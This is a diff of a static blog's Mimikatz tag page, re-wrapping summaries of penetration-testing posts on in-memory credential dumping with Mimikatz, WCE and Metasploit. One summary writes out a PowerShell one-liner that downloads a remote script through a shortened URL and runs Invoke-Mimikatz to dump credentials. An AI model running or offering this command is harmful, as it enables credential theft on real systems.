@@ -14,7 +14,7 @@
 <meta name="description" content="">
 <meta name="keywords" content="">
 <meta name="author" content="">
-<meta name="generator" content="Hugo 0.16" />
+<meta name="generator" content="Hugo 0.17" />
 
   <meta property="og:title" content="Mimikatz" />
 <meta property="og:description" content="" />
@@ -145,7 +145,9 @@
       				
             </p>
             <article class="post-summary">
-            	clymb3r recently posted a script called &ldquo;Invoke-Mimikatz.ps1&rdquo; basically what this does is reflectively injects mimikatz into memory, calls for all the logonPasswords and exits. It even checks the targets architecture (x86/x64) first and injects the correct DLL. You can very easily use this script directly from an admin command prompt as so: powershell &quot;IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds&quot; (This works REALLY well for Citrix and Kiosk scenarios and it&rsquo;s too hard to type/remember) This runs the powershell script by directly pulling it from Github and executing it &ldquo;in memory&rdquo; on your system.
+            	clymb3r recently posted a script called &ldquo;Invoke-Mimikatz.ps1&rdquo; basically what this does is reflectively injects mimikatz into memory, calls for all the logonPasswords and exits. It even checks the targets architecture (x86/x64) first and injects the correct DLL.
+You can very easily use this script directly from an admin command prompt as so:
+powershell &quot;IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds&quot;  (This works REALLY well for Citrix and Kiosk scenarios and it&rsquo;s too hard to type/remember) This runs the powershell script by directly pulling it from Github and executing it &ldquo;in memory&rdquo; on your system.
             </article>
 			<div class="read-more-link">
 				<a href="/post/2013/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz/"><span class="read-more-slashes">//</span>Read More...</a>
@@ -225,7 +227,8 @@
       				
             </p>
             <article class="post-summary">
-            	Mimikatz is awesome right, so is WCE. But both have one fatal flaw, even though you can execute them in memory {link} - you still have to have the binaries, remember the command to execute it in memory, and ultimately transfer the entire binary over so that metasploit can do its thing. Then along came SessionDump. I only noticed this because someone was tweeting congratulations to someone on writing it: No blog post or huge Vegas lights talk on it at DefCon or Blackhat.
+            	Mimikatz is awesome right, so is WCE. But both have one fatal flaw, even though you can execute them in memory {link} - you still have to have the binaries, remember the command to execute it in memory, and ultimately transfer the entire binary over so that metasploit can do its thing.
+Then along came SessionDump. I only noticed this because someone was tweeting congratulations to someone on writing it:
             </article>
 			<div class="read-more-link">
 				<a href="/post/2013/2013-04-08-sessiondump-meterpreter-extension/"><span class="read-more-slashes">//</span>Read More...</a>
@@ -263,7 +266,9 @@
       				
             </p>
             <article class="post-summary">
-            	Executing WCE.exe in memory as demoed by Egypt here: https://community.rapid7.com/community/metasploit/blog/2012/05/08/eternal-sunshine-of-the-spotless-ram has two issues with it. 1, you leave a file on disk with your hashes and clear text passwords. That just won&rsquo;t do. 2. There is this DLL called WCEAUX.dll that gets written for the briefest second to disk: (yes I realize I&rsquo;m running this on disk &lsquo;wce32.exe&rsquo;, but it exhibits the same DLL drop when doing in-memory) Now, don&rsquo;t get me wrong, I love WCE, and Hernan Ochoa does an amazing job with it, but when it comes down to it, it&rsquo;s the best tool for the job.
+            	Executing WCE.exe in memory as demoed by Egypt here: https://community.rapid7.com/community/metasploit/blog/2012/05/08/eternal-sunshine-of-the-spotless-ram has two issues with it. 1, you leave a file on disk with your hashes and clear text passwords. That just won&rsquo;t do. 2. There is this DLL called WCEAUX.dll that gets written for the briefest second to disk:
+(yes I realize I&rsquo;m running this on disk &lsquo;wce32.exe&rsquo;, but it exhibits the same DLL drop when doing in-memory)
+Now, don&rsquo;t get me wrong, I love WCE, and Hernan Ochoa does an amazing job with it, but when it comes down to it, it&rsquo;s the best tool for the job.
             </article>
 			<div class="read-more-link">
 				<a href="/post/2012/2012-09-06-completely-in-memory-mimikatz-with-metasploit/"><span class="read-more-slashes">//</span>Read More...</a>
@@ -303,7 +308,8 @@
       				
             </p>
             <article class="post-summary">
-            	One of the powers of Metasploit is it&rsquo;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level. Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked.
+            	One of the powers of Metasploit is it&rsquo;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.
+Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked.
             </article>
 			<div class="read-more-link">
 				<a href="/post/2012/2012-06-15-integration-of-mimikatz-into-metasploit-stage1/"><span class="read-more-slashes">//</span>Read More...</a>
@@ -341,7 +347,10 @@
       				
             </p>
             <article class="post-summary">
-            	A friend of mine is presenting at phDays in Moscow at the end of May. If you are in the area, or can be, I would highly recommend you attend, and in particularly his talk. His blog is here: http://blog.gentilkiwi.com/ And since a picture is worth a thousand words: You should really go check out what he is going to present&hellip; just sayin&rsquo;
+            	A friend of mine is presenting at phDays in Moscow at the end of May. If you are in the area, or can be, I would highly recommend you attend, and in particularly his talk.
+His blog is here: http://blog.gentilkiwi.com/
+And since a picture is worth a thousand words:
+You should really go check out what he is going to present&hellip; just sayin&rsquo;
             </article>
 			<div class="read-more-link">
 				<a href="/post/2012/2012-04-26-phdays-in-moscow/"><span class="read-more-slashes">//</span>Read More...</a>
